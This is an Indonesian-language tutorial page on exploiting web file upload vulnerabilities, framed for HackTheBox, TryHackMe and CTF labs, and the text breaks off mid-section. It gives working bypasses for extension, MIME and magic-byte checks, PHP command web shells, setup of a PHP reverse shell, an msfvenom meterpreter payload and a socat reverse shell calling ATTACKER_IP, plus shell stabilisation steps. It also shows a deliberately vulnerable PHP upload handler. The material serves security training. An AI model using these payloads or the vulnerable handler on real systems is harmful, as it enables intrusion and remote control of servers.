---
id: "25"
title: "25 — File Upload Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "25_file_upload_workflow.md"
refs_out: ["05","06","07","14a","24","44","45"]
refs_in: ["04","14d","15","16","24","26","27","28"]
---

← [File 24: LFI/RFI](/docs/lfi-rfi)

# 25 — File Upload Workflow

> **Category:** Web Exploitation  
> **Difficulty:** Fundamental → Intermediate  
> **Type:** Vulnerability / Attack Surface → Exploitation  
> **Prerequisites:**
> 
> - [File 24: LFI/RFI](/docs/lfi-rfi)
>     
> - HTTP fundamentals
>     
> - Basic Linux commands
>     
> - Basic PHP knowledge
>     
> - `curl`
>     
> - Burp Suite
>     
> 
> **Target:** HackTheBox, TryHackMe, PortSwigger, CTF/lab yang memang mengizinkan pengujian.

---

# Daftar Isi

- [0 — File Upload Fundamentals](#0--file-upload-fundamentals)
    
    - [0.1 Apa Itu File Upload Vulnerability](#01-apa-itu-file-upload-vulnerability)
        
    - [0.2 Attack Surface](#02-attack-surface)
        
    - [0.3 Reconnaissance Upload](#03-reconnaissance-upload)
        
- [1 — Bypass Teknik](#1--bypass-teknik)
    
    - [1.1 Extension Bypass](#11-extension-bypass)
        
    - [1.2 MIME Type / Content-Type Bypass](#12-mime-type--content-type-bypass)
        
    - [1.3 Magic Bytes Bypass](#13-magic-bytes-bypass)
        
    - [1.4 Double Extension](#14-double-extension)
        
    - [1.5 Null Byte Injection](#15-null-byte-injection)
        
    - [1.6 Case Manipulation](#16-case-manipulation)
        
    - [1.7 Overlong Filename](#17-overlong-filename)
        
- [2 — Payload Creation](#2--payload-creation)
    
    - [2.1 PHP Web Shell](#21-php-web-shell)
        
    - [2.2 PHP Reverse Shell](#22-php-reverse-shell)
        
    - [2.3 ASP/ASPX Shell](#23-aspaspx-shell)
        
    - [2.4 JSP Shell](#24-jsp-shell)
        
    - [2.5 Server/Language Payload Matrix](#25-serverlanguage-payload-matrix)
        
    - [2.6 Image Polyglot](#26-image-polyglot)
        
    - [2.7 ImageTragick — Parser Attack Example](#27-imagetragick--parser-attack-example)
        
- [3 — Bypass Advanced](#3--bypass-advanced)
    
    - [3.1 `.htaccess` Upload](#31-htaccess-upload-apache)
        
    - [3.2 SVG Upload XSS](#32-svg-upload-xss)
        
    - [3.3 ZIP Slip](#33-zip-slip)
        
    - [3.4 Race Condition Upload](#34-race-condition-upload)
        
    - [3.5 Upload via API](#35-upload-via-api)
        
- [4 — Path Prediction & Execution](#4--path-prediction--execution)
    
    - [4.1 Prediksi Path Upload](#41-cara-prediksi-path-upload)
        
    - [4.2 Trigger Execution](#42-trigger-execution)
        
    - [4.3 Upload + LFI Combo](#43-upload--lfi-combo)
        
- [5 — Tools & Automation](#5--tools--automation)
    
    - [5.1 Manual Testing dengan curl](#51-manual-testing-dengan-curl)
        
    - [5.2 Burp Suite](#52-burp-suite-untuk-upload-testing)
        
    - [5.3 `upload_test.sh`](#53-script-upload_testsh)
        
- [6 — Master Decision Tree](#6--decision-tree-lengkap)
    
- [7 — Common Errors & Troubleshooting](#7--common-errors--troubleshooting)
    
- [8 — Golden Rules](#8--golden-rules)
    

---

# 0 — File Upload Fundamentals

## 0.1 Apa Itu File Upload Vulnerability

File Upload Vulnerability terjadi ketika aplikasi menerima file dari user tetapi **validasi, penyimpanan, pemrosesan, atau eksekusinya tidak aman**.

Upload file sendiri bukan vulnerability.

Masalah muncul ketika attacker dapat mengontrol salah satu atau beberapa hal berikut:

```text
filename
extension
MIME type
file content
storage path
permissions
processing pipeline
execution behavior
```

### Model mental utama

```text
                USER
                  │
                  ▼
          ┌────────────────┐
          │ Upload Endpoint │
          └───────┬────────┘
                  │
                  ▼
          ┌────────────────┐
          │ Validation     │
          │                │
          │ Extension?     │
          │ MIME?          │
          │ Magic bytes?   │
          │ Size?          │
          └───────┬────────┘
                  │
                  ▼
          ┌────────────────┐
          │ Storage        │
          │                │
          │ /uploads/      │
          │ /media/        │
          │ /files/        │
          └───────┬────────┘
                  │
          ┌───────┴────────┐
          │                │
          ▼                ▼
      Static file      Executable
      download         server-side
          │             processing
          │                │
          ▼                ▼
    Information         RCE / XSS /
    Disclosure          parser attack
```

### Pertanyaan utama

Jangan langsung berpikir:

> "Bagaimana saya upload shell?"

Gunakan urutan:

```text
1. Apakah upload tersedia?
2. Apa yang divalidasi?
3. Di mana file disimpan?
4. Dengan nama apa?
5. Apakah file dapat diakses?
6. Apakah file diproses?
7. Apakah file executable?
8. Kalau tidak executable, apakah dapat dipakai oleh vulnerability lain?
```

---

## Unrestricted Upload vs Bypass Upload

### Unrestricted upload

Aplikasi sama sekali tidak membatasi file berbahaya.

Contoh:

```text
shell.php
```

diterima dan kemudian:

```text
/uploads/shell.php
```

dapat dieksekusi.

Ini merupakan kondisi yang sangat kuat.

---

### Bypass upload

Aplikasi memiliki validation tetapi validation dapat dilewati.

Contoh:

```text
shell.php
    ↓
Rejected

shell.phtml
    ↓
Accepted
```

atau:

```text
shell.php
    ↓
Rejected because MIME = application/x-php

shell.php
Content-Type: image/jpeg
    ↓
Accepted
```

---

## Kapan File Upload Menjadi RCE?

Upload vulnerability tidak otomatis berarti RCE.

### Kondisi RCE langsung

```text
Attacker uploads PHP
        ↓
Server stores PHP
        ↓
Directory is web-accessible
        ↓
PHP handler processes .php
        ↓
Attacker requests file
        ↓
Code executes
        ↓
RCE
```

---

### Information Disclosure

Misalnya:

```text
upload → predictable filename → public URL
```

tetapi file tidak executable.

Attacker mungkin masih memperoleh:

```text
source code
internal documents
configuration files
private uploads
backup files
metadata
```

---

### XSS

Contohnya:

```text
malicious.svg
     ↓
stored
     ↓
browser renders SVG
     ↓
JavaScript executes
```

---

### Parser vulnerability

File upload juga dapat menyerang:

```text
ImageMagick
Ghostscript
LibreOffice
PDF parser
DOCX parser
archive extractor
video/audio parser
```

Jadi:

```text
File Upload
├── RCE
├── XSS
├── Information Disclosure
├── Path Traversal
├── ZIP Slip
├── SSRF
└── Parser Exploitation
```

---

## Vulnerable PHP Example

```php
<?php

$target = "uploads/" . $_FILES["file"]["name"];

move_uploaded_file(
    $_FILES["file"]["tmp_name"],
    $target
);

echo "Uploaded: " . $target;
```

Masalah:

```text
1. User controls filename
2. No extension validation
3. No MIME validation
4. No magic-byte validation
5. User-controlled storage name
6. Potential path traversal
7. Potential executable upload
```

---

## Contoh PHP yang Lebih Aman

```php
<?php

$allowedMime = [
    "image/jpeg",
    "image/png",
    "image/gif"
];

$allowedExtensions = [
    "jpg",
    "jpeg",
    "png",
    "gif"
];

if (!isset($_FILES["file"])) {
    die("No file supplied");
}

$file = $_FILES["file"];

if ($file["error"] !== UPLOAD_ERR_OK) {
    die("Upload failed");
}

if ($file["size"] > 2 * 1024 * 1024) {
    die("File too large");
}

$extension = strtolower(
    pathinfo($file["name"], PATHINFO_EXTENSION)
);

if (!in_array($extension, $allowedExtensions, true)) {
    die("Extension not allowed");
}

$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($file["tmp_name"]);

if (!in_array($mime, $allowedMime, true)) {
    die("Invalid MIME type");
}

$randomName = bin2hex(random_bytes(16)) . "." . $extension;

$destination = __DIR__ . "/uploads/" . $randomName;

if (!move_uploaded_file(
    $file["tmp_name"],
    $destination
)) {
    die("Unable to store file");
}

echo "Upload successful";
```

Namun, bahkan validasi seperti ini harus dipertimbangkan bersama:

```text
web-server configuration
file permissions
storage location
image re-encoding
content-disposition
access control
virus/malware scanning
```

---

# 0.2 Attack Surface

Cari semua lokasi aplikasi yang menerima file.

|Attack Surface|Contoh|
|---|---|
|Upload form|`/upload`|
|Avatar|`/profile/avatar`|
|Profile picture|`/account/photo`|
|Document|`/documents/upload`|
|Image|`/gallery/upload`|
|Archive|`/backup/import`|
|API|`/api/upload`|
|Drag & Drop|JavaScript uploader|
|Admin upload|`/admin/media`|
|Import feature|`/import`|
|Attachment|`/ticket/attachment`|
|Chat|`/messages/attachment`|

### 📌 Kapan Digunakan

Gunakan attack-surface enumeration **setiap kali melihat aplikasi yang memungkinkan user mengirim file**.

Jangan hanya menguji `/upload`.

Cari juga:

```text
profile
avatar
media
attachment
document
import
backup
template
theme
plugin
gallery
```

---

# 0.3 Reconnaissance Upload

## Identifikasi Upload Endpoint

Mulai dari UI.

Cari:

```text
Choose File
Upload
Browse
Attachment
Avatar
Profile Picture
Import
Drag & Drop
```

### Cari Upload Endpoint via Command

```bash
# Cari upload endpoint di source code HTML/JS yang sudah didownload
grep -r "upload\|multipart\|enctype" \
  --include="*.html" \
  --include="*.js" \
  . 2>/dev/null

# Cari via ffuf untuk endpoint upload
ffuf \
  -u http://TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,403 \
  -fc 404 \
  | grep -i "upload\|file\|media\|attach"

# Cari form dengan enctype multipart di halaman yang ditemukan
curl -s http://TARGET/page | grep -i "multipart\|file\|upload"

# Alternative dengan gobuster
gobuster dir \
  -u http://TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 50 \
  2>/dev/null | grep -i "upload\|file"
```

Kemudian inspect request dengan Burp.

Contoh:

```http
POST /upload.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
```

Body:

```http
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

hello
------WebKitFormBoundary--
```

---

## Baca Response

Response idealnya memberi clue:

```http
HTTP/1.1 200 OK

{
  "success": true,
  "filename": "test.txt",
  "path": "/uploads/test.txt",
  "url": "/uploads/test.txt"
}
```

Ini sangat berharga.

Kita mendapatkan:

```text
filename
storage path
public URL
```

---

## Identifikasi Storage Location

Common locations:

```text
/uploads/
/upload/
/files/
/media/
/images/
/assets/
/static/uploads/
/static/files/
/attachments/
/documents/
```

### 📌 Kapan Digunakan

Digunakan setelah upload berhasil tetapi aplikasi tidak secara eksplisit memberi URL file.

---

## Identifikasi Execution

Upload:

```text
test.php
```

Isi:

```php
<?php echo "UPLOAD_OK"; ?>
```

Jika response ketika mengakses:

```text
/uploads/test.php
```

adalah:

```text
UPLOAD_OK
```

maka:

```text
PHP execution confirmed
```

Jika browser malah mendownload file:

```text
<?php echo "UPLOAD_OK"; ?>
```

berarti kemungkinan:

```text
file stored
but not executed
```

---

# 1 — Bypass Teknik

# 1.1 Extension Bypass

Extension validation biasanya menggunakan dua pendekatan:

```text
Blacklist
Whitelist
```

## Blacklist

Contoh:

```php
if ($extension === "php") {
    die("Not allowed");
}
```

Masalah:

```text
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.phps
```

bisa memiliki behavior berbeda tergantung server/configuration.

---

## Whitelist

Contoh:

```php
$allowed = ["jpg", "png", "gif"];

if (!in_array($extension, $allowed, true)) {
    die("Invalid extension");
}
```

Whitelist biasanya lebih kuat, tetapi tetap perlu MIME/content validation dan storage yang non-executable.

---

## PHP Extension Alternatives

|Extension|Server/Handler|Works when|
|---|---|---|
|`.php`|PHP|PHP handler aktif|
|`.php3`|PHP|Legacy PHP mapping tersedia|
|`.php4`|PHP|Legacy handler tersedia|
|`.php5`|PHP|Legacy/server mapping tersedia|
|`.php7`|PHP|Server mapping khusus tersedia|
|`.phtml`|PHP|PHP handler memetakan `.phtml`|
|`.phar`|PHP|Handler/configuration mendukung|
|`.phps`|PHP|Legacy/source display configuration|
|`.php-s`|Server-dependent|Custom/legacy mapping|
|`.pgif`|Server-dependent|Custom/legacy mapping|
|`.shtml`|Apache|SSI/configuration memungkinkan|

**Catatan penting:** daftar ini bukan checklist universal. Pada server modern, sebagian besar extension alternatif **tidak akan bekerja**.

---

## ASP / ASP.NET

|Extension|Environment|Works when|
|---|---|---|
|`.asp`|Classic ASP/IIS|Classic ASP enabled|
|`.aspx`|ASP.NET/IIS|ASP.NET handler aktif|
|`.cer`|IIS|MIME/handler mapping tertentu|
|`.asa`|IIS|Mapping tertentu|
|`.config`|IIS|Configuration behavior; biasanya bukan executable upload|
|`.aspx`|ASP.NET|Handler aktif|

---

## JSP

|Extension|Environment|Works when|
|---|---|---|
|`.jsp`|Java servlet container|JSP enabled|
|`.jspx`|Java|JSP XML syntax enabled|
|`.jsw`|Container-dependent|Mapping tertentu|
|`.jsv`|Container-dependent|Mapping tertentu|

---

## Extension Testing

Buat payload sederhana:

```php
<?php echo "UPLOAD_OK"; ?>
```

Simpan:

```bash
printf '%s\n' '<?php echo "UPLOAD_OK"; ?>' > test.php
```

Test:

```bash
curl -i -F 'file=@test.php;filename=test.php' \
  http://TARGET/upload.php
```

Kemudian:

```bash
curl -i http://TARGET/uploads/test.php
```

---

### Test `.phtml`

```bash
curl -i \
  -F 'file=@test.php;filename=test.phtml' \
  http://TARGET/upload.php
```

### Test `.php5`

```bash
curl -i \
  -F 'file=@test.php;filename=test.php5' \
  http://TARGET/upload.php
```

### Test `.phar`

```bash
curl -i \
  -F 'file=@test.php;filename=test.phar' \
  http://TARGET/upload.php
```

### Test `.php3`

```bash
curl -i \
  -F 'file=@test.php;filename=test.php3' \
  http://TARGET/upload.php
```

### Test `.php4`

```bash
curl -i \
  -F 'file=@test.php;filename=test.php4' \
  http://TARGET/upload.php
```

### Test `.php7`

```bash
curl -i \
  -F 'file=@test.php;filename=test.php7' \
  http://TARGET/upload.php
```

### Test `.asp`

```bash
curl -i \
  -F 'file=@test.asp;filename=test.asp' \
  http://TARGET/upload.php
```

### Test `.aspx`

```bash
curl -i \
  -F 'file=@test.aspx;filename=test.aspx' \
  http://TARGET/upload.php
```

### Test `.jsp`

```bash
curl -i \
  -F 'file=@test.jsp;filename=test.jsp' \
  http://TARGET/upload.php
```

---

### 📌 Kapan Digunakan

Gunakan extension bypass ketika:

```text
.php → rejected
```

dan response menunjukkan validation berbasis extension.

**Jangan langsung mencoba 50 extension secara membabi buta.**

Pertanyaan:

```text
Apa servernya?
Apa technology stack-nya?
Apa extension yang diterima?
Apakah file hanya disimpan atau dieksekusi?
```

---

# 1.2 MIME Type / Content-Type Bypass

## Apa Itu Content-Type?

HTTP upload biasanya memiliki:

```http
Content-Type: multipart/form-data
```

Setiap part dapat memiliki MIME:

```http
Content-Type: image/jpeg
```

Contoh:

```http
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/jpeg

<?php echo "UPLOAD_OK"; ?>
```

---

## Server-Side vs Client-Side

### Client-side validation

JavaScript:

```javascript
if (!file.type.startsWith("image/")) {
    alert("Invalid file");
}
```

Ini dapat dilewati karena attacker mengontrol request HTTP.

---

### Server-side validation

Server membaca:

```text
Content-Type
file extension
magic bytes
actual file structure
```

Server-side validation harus dianggap lebih penting.

---

## curl Content-Type Bypass

```bash
curl -i \
  -F 'file=@test.php;filename=test.php;type=image/jpeg' \
  http://TARGET/upload.php
```

Alternatif eksplisit:

```bash
curl -i \
  -F 'file=@test.php;filename=test.php' \
  -H 'Content-Type: multipart/form-data' \
  http://TARGET/upload.php
```

Untuk part MIME, gunakan bentuk `type=` pada `-F`.

---

## Burp

Intercept:

```http
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/x-php
```

ubah menjadi:

```http
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/jpeg
```

Pertahankan content:

```php
<?php echo "UPLOAD_OK"; ?>
```

---

## Common MIME Types

|File|MIME|
|---|---|
|JPG|`image/jpeg`|
|PNG|`image/png`|
|GIF|`image/gif`|
|PDF|`application/pdf`|
|ZIP|`application/zip`|
|TXT|`text/plain`|
|JSON|`application/json`|
|XML|`application/xml`|
|SVG|`image/svg+xml`|

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
extension benar
tetapi MIME validation menolak
```

atau ketika:

```text
application terlihat hanya memercayai Content-Type
```

---

# 1.3 Magic Bytes Bypass

## Apa Itu Magic Bytes?

Magic bytes adalah signature pada awal file yang membantu mengidentifikasi format.

|File|Magic Bytes|
|---|---|
|JPG|`FF D8 FF`|
|PNG|`89 50 4E 47`|
|GIF|`47 49 46 38`|
|PDF|`25 50 44 46`|
|ZIP|`50 4B 03 04`|

Magic bytes **bukan MIME header HTTP**.

---

## Cek dengan `file`

```bash
file test.php
```

Contoh:

```text
test.php: PHP script, ASCII text
```

---

## Cek dengan `xxd`

```bash
xxd -l 16 test.php
```

Contoh:

```text
00000000: 3c3f 7068 7020 6563 686f 2022 5550 4c4f  <?php echo "UPLO
```

---

## Membuat GIF + PHP

Buat:

```bash
# Command yang lebih reliable untuk GIF magic bytes
printf 'GIF89a\n' > shell.gif.php
printf '<?php echo "UPLOAD_OK"; ?>\n' >> shell.gif.php

# Atau cara yang lebih explicit:
{
  printf 'GIF89a'
  printf '\n'
  printf '<?php echo "UPLOAD_OK"; ?>\n'
} > shell.gif.php

# Verify magic bytes dengan xxd:
xxd -l 16 shell.gif.php
# Expected output: 47 49 46 38 39 61 (GIF89a dalam hex)
```

Cek:

```bash
xxd -l 32 shell.gif.php
```

Expected beginning:

```text
00000000: 4749 4638 3961
```

Cek:

```bash
file shell.gif.php
```

---

## Membuat File dengan Raw Bytes

Untuk lab:

```bash
printf '\xFF\xD8\xFF' > polyglot.jpg.php
printf '%s\n' '<?php echo "UPLOAD_OK"; ?>' >> polyglot.jpg.php
```

Cek:

```bash
xxd -l 32 polyglot.jpg.php
```

Expected:

```text
00000000: ffd8 ff3c 3f70 6870 ...
```

---

## Upload

```bash
curl -i \
  -F 'file=@polyglot.jpg.php;filename=polyglot.jpg.php;type=image/jpeg' \
  http://TARGET/upload.php
```

---

### 📌 Kapan Digunakan

Gunakan ketika aplikasi melakukan:

```text
magic-byte validation
```

tetapi:

```text
server tetap menyimpan content tambahan
```

Perlu diingat:

> Magic bytes tidak mengubah file menjadi image yang valid.

Validator yang benar-benar melakukan image decoding/re-encoding dapat menggagalkan teknik ini.

---

# 1.4 Double Extension

Konsep:

```text
shell.php.jpg
```

atau:

```text
shell.jpg.php
```

Perbedaan penting:

```text
shell.php.jpg
```

sering hanya berfungsi jika aplikasi/server salah menentukan extension atau menggunakan parsing filename yang tidak tepat.

---

## Test

```bash
curl -i \
  -F 'file=@test.php;filename=shell.php.jpg' \
  http://TARGET/upload.php
```

Kemudian:

```bash
curl -i \
  http://TARGET/uploads/shell.php.jpg
```

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
application melakukan parsing extension secara berbeda
```

antara:

```text
validation layer
```

dan:

```text
server execution layer
```

---

## `.htaccess` Relation

Pada Apache, `.htaccess` dapat mengubah mapping file jika server mengizinkannya.

Lihat [3.1 `.htaccess` Upload](#31-htaccess-upload-apache).

---

# 1.5 Null Byte Injection

Payload klasik:

```text
shell.php%00.jpg
```

Konsep lama:

```text
application sees:

shell.php
```

tetapi komponen lain mungkin melihat:

```text
shell.php.jpg
```

atau sebaliknya.

### 📌 Kapan Digunakan

**Hanya prioritaskan pada challenge/lab yang menunjukkan behavior legacy.**

Modern PHP dan banyak library modern sudah memperbaiki null-byte truncation.

---

## Test

```bash
curl -i \
  --data-binary @test.php \
  'http://TARGET/upload.php?filename=shell.php%00.jpg'
```

Jika endpoint menggunakan multipart:

```bash
curl -i \
  -F 'file=@test.php;filename=shell.php%00.jpg' \
  http://TARGET/upload.php
```

Jika curl/client/server menormalisasi karakter tersebut, gunakan Burp untuk melihat request mentah.

---

# 1.6 Case Manipulation

Coba:

```text
shell.PHP
shell.Php
shell.pHp
```

Test:

```bash
curl -i \
  -F 'file=@test.php;filename=shell.PHP' \
  http://TARGET/upload.php
```

---

### Linux vs Windows

Linux umumnya:

```text
shell.php
shell.PHP
```

adalah dua nama berbeda.

Windows filesystem secara umum case-insensitive:

```text
shell.php
SHELL.PHP
```

dapat merujuk objek yang sama.

Tetapi **extension handling server tetap bergantung pada web-server/application configuration**.

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
validation terlihat case-sensitive
```

atau target menggunakan:

```text
Windows/IIS
```

---

# 1.7 Overlong Filename

Contoh:

```text
shell.php........
```

atau nama dengan trailing space/dot.

Teknik ini terutama berhubungan dengan:

```text
Windows filename normalization
```

dan perbedaan parsing antara component.

---

### 📌 Kapan Digunakan

Gunakan hanya ketika:

```text
target Windows
```

dan terdapat indikasi:

```text
filename normalization discrepancy
```

---

## Contoh URL Encoding

```text
shell.php%20
```

atau:

```text
shell.php%2e
```

Namun server/framework modern dapat melakukan normalization sebelum validation.

---

# 2 — Payload Creation

# 2.1 PHP Web Shell

## Payload 1 — Echo Test

Selalu mulai dari payload paling sederhana.

```php
<?php echo "UPLOAD_OK"; ?>
```

Buat:

```bash
printf '%s\n' '<?php echo "UPLOAD_OK"; ?>' > test.php
```

Test lokal:

```bash
php -S 127.0.0.1:8000
```

Kemudian:

```bash
curl http://127.0.0.1:8000/test.php
```

Expected:

```text
UPLOAD_OK
```

---

### 📌 Kapan Digunakan

**Selalu gunakan payload ini terlebih dahulu.**

Tujuannya bukan mendapatkan shell.

Tujuannya:

```text
prove execution
```

---

# Command Execution Payload

Untuk lab:

```php
<?php system($_GET['cmd']); ?>
```

Buat:

```bash
printf '%s\n' '<?php system($_GET["cmd"]); ?>' > cmd.php
```

Trigger:

```bash
curl -G \
  --data-urlencode 'cmd=id' \
  http://TARGET/uploads/cmd.php
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## `shell_exec`

Lab-only payload:

```php
<?php echo shell_exec($_REQUEST['c']); ?>
```

Trigger:

```bash
curl -G \
  --data-urlencode 'c=id' \
  http://TARGET/uploads/cmd.php
```

---

## Minimal Shell

```php
<?php

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    if ($cmd === '') {
        exit;
    }

    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
```

---

### ⚠️ Catatan

Payload command shell seperti ini sangat berbahaya di production.

Gunakan hanya:

```text
HTB
THM
PortSwigger
local lab
CTF
```

---

# 2.2 PHP Reverse Shell

Reverse shell:

```text
TARGET
  │
  │ outbound connection
  ▼
ATTACKER
listener
```

---

## Cari Existing Webshell

Pada Parrot OS:

```bash
ls -la /usr/share/webshells/
```

Cari PHP:

```bash
find /usr/share/webshells/ -type f -iname '*php*' 2>/dev/null
```

Jika tersedia:

```bash
find /usr/share/webshells/php/ -type f -maxdepth 1 -print
```

### Cara Pakai Webshells dari /usr/share/webshells

#### Untuk PHP Target

Webshell yang paling sering dipakai di CTF:

1. **php-reverse-shell.php** (pentestmonkey) — perlu edit LHOST dan LPORT
2. **simple-backdoor.php** — sudah ada parameter `?cmd=`

**Setup php-reverse-shell.php:**

```bash
# Copy ke working directory
cp /usr/share/webshells/php/php-reverse-shell.php ./revshell.php

# Edit IP dan port dengan sed
LHOST="10.10.14.5"  # Ganti dengan tun0 IP kamu
LPORT="4444"

sed -i "s/127.0.0.1/$LHOST/g" revshell.php
sed -i "s/1234/$LPORT/g" revshell.php

# Atau edit manual dengan nano:
nano revshell.php
# Cari line:
#   $ip = '127.0.0.1';  // GANTI dengan tun0 IP
#   $port = 1234;       // GANTI dengan port listener

# Verify changes
grep -E "ip =|port =" revshell.php
```

**Setup simple-backdoor.php:**

```bash
# Copy ke working directory
cp /usr/share/webshells/php/simple-backdoor.php ./cmd.php

# File ini tidak perlu di-edit
# Usage setelah upload:
#   http://TARGET/uploads/cmd.php?cmd=id
```

**Webshells lain yang tersedia:**

```bash
# List semua PHP webshells
ls -1 /usr/share/webshells/php/

# Output contoh:
# php-backdoor.php
# php-reverse-shell.php
# qsd-php-backdoor.php
# simple-backdoor.php
```

---

## Listener

Basic:

```bash
nc -lvnp 4444
```

Dengan `rlwrap`:

```bash
rlwrap nc -lvnp 4444
```

---

## Shell Stabilization — Setelah Dapat Reverse Shell

Setelah reverse shell diterima di nc listener, shell masih **"dumb terminal"** yang perlu di-stabilize.

### Method 1: Python pty (PALING UMUM)

```bash
# Di reverse shell yang baru diterima, jalankan:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Kemudian tekan Ctrl+Z untuk background nc
# Lalu di terminal attacker:
stty raw -echo; fg

# Tekan Enter dua kali

# Set TERM dan ukuran terminal:
export TERM=xterm
stty rows 50 cols 220

# Optional: set SHELL
export SHELL=/bin/bash
```

### Method 2: script Command

```bash
# Di reverse shell:
script /dev/null -c bash
```

### Method 3: socat (Jika tersedia di target)

```bash
# Di attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Di target (via webshell atau RCE):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

### Verifikasi Shell Stabil

```bash
# Test autocomplete dengan Tab
ls /et[TAB]  # Harus complete ke /etc/

# Test Ctrl+C (harus tidak disconnect)
ping 8.8.8.8
# Tekan Ctrl+C, shell harus masih aktif

# Check TERM
echo $TERM
# Output: xterm atau screen

# Check tty
tty
# Output: /dev/pts/X (bukan "not a tty")
```

### Troubleshooting Shell Stabilization

```bash
# Jika Ctrl+Z tidak work:
# Pastikan terminal attacker support job control
# Coba gunakan socat atau method 2

# Jika stty raw -echo error:
# Jalankan tanpa -echo dulu:
stty raw; fg

# Jika python3 tidak ada:
# Coba python atau python2
python -c 'import pty; pty.spawn("/bin/bash")'

# Jika semua gagal, minimal set TERM:
export TERM=xterm
```

---

## Payload Generation dengan msfvenom

Cari format PHP:

```bash
msfvenom -l payloads | grep -i php
```

Pada lab yang memang mendukung payload tersebut, gunakan format yang sesuai environment.

Contoh generic workflow:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP \
  LPORT=4444 \
  -f raw \
  -o shell.php
```

**Jangan mengasumsikan payload tersebut cocok dengan setiap PHP version atau server.**

---

## Trigger

Setelah upload berhasil:

```bash
curl -i http://TARGET/uploads/shell.php
```

Jika server mengeksekusi payload:

```text
TARGET
  │
  │ reverse connection
  ▼
nc -lvnp 4444
```

---

### 📌 Kapan Digunakan

Gunakan reverse shell **setelah execution sudah terbukti**.

Urutan yang lebih baik:

```text
Upload
  ↓
Execution proof
  ↓
Command execution
  ↓
Reverse shell
```

Jangan langsung debugging reverse shell ketika sebenarnya:

```text
PHP belum dieksekusi
```

---

# 2.3 ASP/ASPX Shell

## Classic ASP

Untuk IIS/Classic ASP lab:

```asp
<%
Response.Write("UPLOAD_OK")
%>
```

Simpan:

```text
test.asp
```

Upload:

```bash
curl -i \
  -F 'file=@test.asp;filename=test.asp' \
  http://TARGET/upload.php
```

Trigger:

```bash
curl -i http://TARGET/uploads/test.asp
```

---

## ASPX

Minimal test:

```aspx
<%@ Page Language="C#" %>
<%
Response.Write("UPLOAD_OK");
%>
```

Simpan:

```text
test.aspx
```

---

### 📌 Kapan Digunakan

Gunakan jika fingerprinting menunjukkan:

```text
IIS
ASP.NET
Classic ASP
```

---

# 2.4 JSP Shell

Minimal JSP:

```jsp
<%
out.println("UPLOAD_OK");
%>
```

Simpan:

```text
test.jsp
```

Upload:

```bash
curl -i \
  -F 'file=@test.jsp;filename=test.jsp' \
  http://TARGET/upload.php
```

Trigger:

```bash
curl -i http://TARGET/uploads/test.jsp
```

---

### 📌 Kapan Digunakan

Gunakan ketika target menunjukkan:

```text
Tomcat
Jetty
JSP
Java servlet container
```

---

# 2.5 Server/Language Payload Matrix

### 📌 Kapan Digunakan

Gunakan tabel ini untuk menentukan payload yang tepat berdasarkan server/framework yang terdeteksi.

| Server | Language | Test Payload | Extension | Notes |
|---|---|---|---|---|
| **Apache + PHP** | PHP | `<?php echo "OK"; ?>` | `.php`, `.phtml`, `.phar` | Paling umum di CTF |
| **Apache + mod_perl** | Perl | `print "OK";` | `.pl`, `.cgi` | Jarang |
| **IIS** | ASP Classic | `<% Response.Write("OK") %>` | `.asp` | Windows server |
| **IIS + .NET** | ASPX | `<% Response.Write("OK"); %>` | `.aspx` | Modern IIS |
| **Tomcat** | JSP | `<% out.println("OK"); %>` | `.jsp` | Java application server |
| **Nginx + PHP-FPM** | PHP | `<?php echo "OK"; ?>` | `.php` | Modern stack |
| **Node.js** | JavaScript | Tidak bisa execute via upload langsung | - | Perlu code injection |
| **Python (Flask/Django)** | Python | Tidak bisa execute via upload langsung | - | Perlu code injection |

### Cara Deteksi Server dari Nmap/Header

```bash
# Dari nmap scan sebelumnya:
# Apache → test PHP payloads dulu
# IIS → test ASP/ASPX
# Tomcat → test JSP
# Nginx → biasanya PHP-FPM, test PHP

# Dari response header:
curl -I http://TARGET/

# Cari header:
# Server: Apache/2.4.41 → PHP candidate
# Server: Microsoft-IIS/10.0 → ASP.NET candidate
# Server: nginx/1.18.0 → PHP-FPM candidate
# X-Powered-By: → bisa reveal framework (PHP/5.6.40, ASP.NET, etc)

# Dari WhatWeb:
whatweb http://TARGET/

# Output contoh:
# HTTPServer[Apache/2.4.41], PHP[5.6.40]
```

### Decision Tree: Server → Payload

```text
Detected Server?
       │
       ├─ Apache/Nginx
       │  └─ Test: .php → <?php echo "OK"; ?>
       │
       ├─ IIS
       │  ├─ Old (IIS 6-7) → Test: .asp
       │  └─ Modern (IIS 8+) → Test: .aspx
       │
       ├─ Tomcat
       │  └─ Test: .jsp → <% out.println("OK"); %>
       │
       └─ Unknown
          └─ Try PHP first (paling umum), lalu ASP, JSP
```

---

# 2.6 Image Polyglot

## Apa Itu Polyglot?

Polyglot adalah file yang sengaja dibuat valid atau cukup valid menurut lebih dari satu parser/interpretasi.

Concept:

```text
Image parser
      +
PHP parser
```

---

## GIF Example

```bash
printf 'GIF89a\n' > polyglot.gif.php
printf '<?php echo "UPLOAD_OK"; ?>\n' >> polyglot.gif.php
```

Cek:

```bash
xxd -l 32 polyglot.gif.php
```

Expected:

```text
47 49 46 38 39 61
```

---

## Upload

```bash
curl -i \
  -F 'file=@polyglot.gif.php;filename=polyglot.gif.php;type=image/gif' \
  http://TARGET/upload.php
```

---

## JPG + PHP

Membuat file dengan header JPEG saja:

```bash
